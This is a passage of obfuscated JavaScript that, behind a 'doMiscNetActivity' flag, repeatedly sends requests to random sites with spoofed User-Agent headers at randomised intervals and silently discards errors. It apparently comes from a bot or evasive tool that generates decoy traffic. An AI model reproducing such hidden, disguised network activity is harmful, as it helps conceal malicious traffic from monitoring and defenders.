      setTimeout(f, (0xbc41 + 0x1 * -0xdfc7 + 0x10de6) * l * getRandomInt(0x30a * -0x9 + -0x1ac * 0x17 + 0x1 * 0x41cf, 0xb6f * -0x1 + 0x1 * -0x166f + 0x21e1));
  }, -0x1edafa + -0x4d5b61 + 0xa324db);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x1c43 + -0x1d72 * -0x1 + -0x1e5d) * getRandomInt(-0x12de + 0x1369 + -0x2e * 0x3, -0x153 * -0x16 + 0x1ab * 0xc + -0x3121 * 0x1));
}, 0xfa1 + -0x2 * 0x10ce + 0x125f);